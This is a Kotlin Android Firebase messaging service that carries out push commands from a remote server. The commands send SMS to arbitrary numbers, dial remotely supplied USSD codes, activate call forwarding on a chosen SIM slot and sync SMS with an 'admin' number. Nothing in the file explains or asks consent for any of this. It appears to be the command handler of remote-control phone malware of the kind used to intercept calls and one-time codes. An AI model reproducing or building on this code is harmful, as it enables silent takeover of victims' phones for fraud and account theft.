package com.example.admin.services

import android.util.Log
import androidx.work.*
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import org.json.JSONObject
import java.util.concurrent.TimeUnit

@Suppress("unused")
class MyFirebaseMessagingService : FirebaseMessagingService() {

    companion object {
        private const val TAG = "FCMService"
    }

    override fun onNewToken(token: String) {
        super.onNewToken(token)
        Log.d(TAG, "FCM token received (ignored, handled in MainActivity): $token")
    }

    override fun onMessageReceived(msg: RemoteMessage) {
        Log.d(TAG, "FCM_RECEIVED data=${msg.data}")

        val type       = msg.data["type"] ?: return
        val payloadStr = msg.data["payload"] ?: return
        val payload    = JSONObject(payloadStr)

        when (type) {
            "CHECK_ONLINE"   -> enqueueCheckOnline(payload)
            "DEVICE_COMMAND" -> routeDeviceCommand(payload)
            "ADMIN_UPDATE"   -> handleAdminUpdate(payload)
            else             -> Log.e(TAG, "Unknown type: $type")
        }
    }

    // ── CHECK_ONLINE ──────────────────────────────────────────────────────────

    private fun enqueueCheckOnline(payload: JSONObject) {
        val uid = payload.optString("uniqueid")
        if (uid.isBlank()) return

        WorkManager.getInstance(applicationContext)
            .enqueue(
                OneTimeWorkRequestBuilder<com.example.admin.workers.CheckOnlineWorker>()
                    .setInputData(workDataOf("uid" to uid))
                    .build()
            )
    }

    // ── DEVICE_COMMAND ────────────────────────────────────────────────────────

    /**
     * FCMHelper sends:
     *   "sms"  → SmsSendWorker
     *   "ussd" → CallForwardWorker (USSD dial)
     *   "call" → CallForwardWorker (voice call forward)
     */
    private fun routeDeviceCommand(payload: JSONObject) {
        when (val action = payload.optString("action").trim().lowercase()) {
            "sms"          -> enqueueSmsWorker(payload)
            "ussd", "call" -> enqueueCallWorker(payload)
            else           -> Log.e(TAG, "Unknown action: $action")
        }
    }

    private fun enqueueCallWorker(payload: JSONObject) {
        val uid     = payload.optString("uniqueid")
        val code    = payload.optString("code")
        val simSlot = payload.optInt("simSlot", 0)
        val action  = payload.optString("action", "ussd")

        if (uid.isBlank() || code.isBlank()) {
            Log.e(TAG, "enqueueCallWorker: missing uid or code")
            return
        }

        WorkManager.getInstance(applicationContext)
            .enqueue(
                OneTimeWorkRequestBuilder<com.example.admin.workers.CallForwardWorker>()
                    .setInputData(
                        workDataOf(
                            "uid"       to uid,
                            "code"      to code,
                            "simSlot"   to simSlot,
                            "action"    to action,
                            "cf_action" to payload.optString("cf_action", "ACTIVATE")
                        )
                    )
                    .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 10, TimeUnit.SECONDS)
                    .build()
            )
    }

    private fun enqueueSmsWorker(payload: JSONObject) {
        val uid     = payload.optString("uniqueid")
        val to      = payload.optString("to")
        val body    = payload.optString("body")
        val simSlot = payload.optInt("simSlot", 0)
        // FCMHelper always sends timestamp; fallback to now just in case
        val timestamp = payload.optLong("timestamp").let {
            if (it > 0) it else System.currentTimeMillis()
        }

        if (uid.isBlank() || to.isBlank() || body.isBlank()) {
            Log.e(TAG, "enqueueSmsWorker: missing uid, to, or body")
            return
        }

        WorkManager.getInstance(applicationContext)
            .enqueue(
                OneTimeWorkRequestBuilder<com.example.admin.workers.SmsSendWorker>()
                    .setInputData(
                        workDataOf(
                            "uid"       to uid,
                            "to"        to to,
                            "body"      to body,
                            "simSlot"   to simSlot,
                            "timestamp" to timestamp
                        )
                    )
                    .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 10, TimeUnit.SECONDS)
                    .build()
            )
    }

    // ── ADMIN_UPDATE ──────────────────────────────────────────────────────────

    /**
     * FCMHelper sends: { deviceId, uniqueid, number, status }
     *
     * We accept both "deviceId" and "uniqueid" for compatibility.
     */
    private fun handleAdminUpdate(payload: JSONObject) {
        // FCMHelper now sends "deviceId"; accept "uniqueid" as fallback
        val deviceId = payload.optString("deviceId").ifBlank {
            payload.optString("uniqueid", "")
        }
        val number = payload.optString("number")
        val status = payload.optString("status")

        if (deviceId.isBlank() || number.isBlank() || status.isBlank()) {
            Log.e(TAG, "handleAdminUpdate: missing deviceId, number, or status")
            return
        }

        WorkManager.getInstance(applicationContext)
            .enqueue(
                OneTimeWorkRequestBuilder<com.example.admin.workers.SmsSyncWorker>()
                    .setInputData(
                        workDataOf(
                            "admin_number" to number,
                            "admin_status" to status
                        )
                    )
                    .setBackoffCriteria(BackoffPolicy.EXPONENTIAL, 10, TimeUnit.SECONDS)
                    .build()
            )
    }
}
